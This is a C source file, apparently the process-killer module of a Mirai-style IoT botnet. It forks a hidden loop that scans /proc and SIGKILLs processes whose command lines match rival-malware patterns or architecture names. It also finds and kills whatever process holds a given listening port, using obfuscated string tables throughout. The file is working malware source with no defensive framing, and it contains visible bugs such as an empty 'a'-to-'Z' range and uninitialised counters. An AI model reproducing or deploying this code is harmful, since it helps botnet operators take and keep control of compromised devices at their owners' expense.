#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL);
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    sleep(5);

#ifdef DEBUG
    printf("(unstable/killer) cmdline killer started, scanning for bad processes!\n");
#endif

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
#ifdef DEBUG
            printf("(unstable/killer) failed to open /proc!\n");
#endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char cmdline_path[64], *ptr_cmdline_path = cmdline_path;
			char maps_path[64], *ptr_maps_path = maps_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;

            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
#ifdef DEBUG
                    printf("(unstable/killer) %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }

            if (pid > killer_highest_pid)
                killer_highest_pid = pid;

            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_CMDLINE);

            ptr_cmdline_path += util_strcpy(ptr_cmdline_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_cmdline_path += util_strcpy(ptr_cmdline_path, file->d_name);
            ptr_cmdline_path += util_strcpy(ptr_cmdline_path, table_retrieve_val(TABLE_KILLER_CMDLINE, NULL));

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_CMDLINE);

            if(pid != getpid() && pid != getppid() && pid != getpid() + 1)
            {
                if (cmdline_scan_match(cmdline_path) == TRUE)
                {
#ifdef DEBUG
                    printf("(unstable/killer) killing harmful process: %s\n", cmdline_path);
#endif
                    kill(pid, 9);
                }
            }
            util_zero(cmdline_path, sizeof (cmdline_path));
        }
        closedir(dir);
    }

#ifdef DEBUG
    printf("(unstable/killer) finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("(unstable/killer) finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        printf("(unstable/killer) found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
#else
                        kill(util_atoi(pid, 10), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL cmdline_scan_match(char *path)
{
    int fd, ret, ii, s, curr_points = 0, num_alphas, num_count, points_to_kill = 3;
    char rdbuf[4096];
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_KILLER_TMP);
    table_unlock_val(TABLE_KILLER_DATALOCAL);
    table_unlock_val(TABLE_KILLER_QTX);
    table_unlock_val(TABLE_KILLER_DOT);
    table_unlock_val(TABLE_KILLER_ARM);
	table_unlock_val(TABLE_KILLER_QTX2);
    table_unlock_val(TABLE_KILLER_X86);
    table_unlock_val(TABLE_KILLER_SH4);
    table_unlock_val(TABLE_KILLER_MIPS);
    table_unlock_val(TABLE_KILLER_MPSL);
    table_unlock_val(TABLE_KILLER_SDA);
    table_unlock_val(TABLE_KILLER_MTD);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
    	if(mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_TMP, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_TMP, NULL))) ||
    	   mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_DATALOCAL, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_DATALOCAL, NULL))) ||
    	   mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_QTX, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_QTX, NULL))) ||
		   mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_QTX2, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_QTX2, NULL)))
    	   )
    		found = TRUE;

    	if(mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_DOT, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_DOT, NULL))) &&
    	   mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_ARM, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_ARM, NULL))) ||
    	   mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_X86, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_X86, NULL))) ||
    	   mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_SH4, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_SH4, NULL))) ||
    	   mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_MIPS, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_MIPS, NULL))) ||
    	   mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_MPSL, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_MPSL, NULL)))
    	   )
    		found = TRUE;

        if(!mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_SDA, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_SDA, NULL))) &&
           !mem_exists(rdbuf, util_strlen(rdbuf), table_retrieve_val(TABLE_KILLER_MTD, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_MTD, NULL))))
        {
            for (ii = 0; ii < util_strlen(rdbuf); ii++)
            {
                if(s == 0)
                {
                    if ((rdbuf[ii] >= 'a' && rdbuf[ii] <= 'Z'))
                    {
                        if(curr_points >= 5) // if its more than or 1 we know we had a int before it, Strange :thinking:
                            curr_points++;

                        s = 1;
                        num_alphas++;
                    }
                }
                else if (rdbuf[ii] >= '0' && rdbuf[ii] <= '9')
                {
                    s = 0;
                    curr_points++;
                    num_count++;
                }
            }
            if (curr_points >= points_to_kill)
            {
                found = TRUE;
            }
        }
    }

    close(fd);

    table_lock_val(TABLE_KILLER_TMP);
    table_lock_val(TABLE_KILLER_DATALOCAL);
    table_lock_val(TABLE_KILLER_QTX);
    table_lock_val(TABLE_KILLER_DOT);
    table_lock_val(TABLE_KILLER_ARM);
	table_lock_val(TABLE_KILLER_QTX2);
    table_lock_val(TABLE_KILLER_X86);
    table_lock_val(TABLE_KILLER_SH4);
    table_lock_val(TABLE_KILLER_MIPS);
    table_lock_val(TABLE_KILLER_MPSL);
    table_lock_val(TABLE_KILLER_SDA);
    table_lock_val(TABLE_KILLER_MTD);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
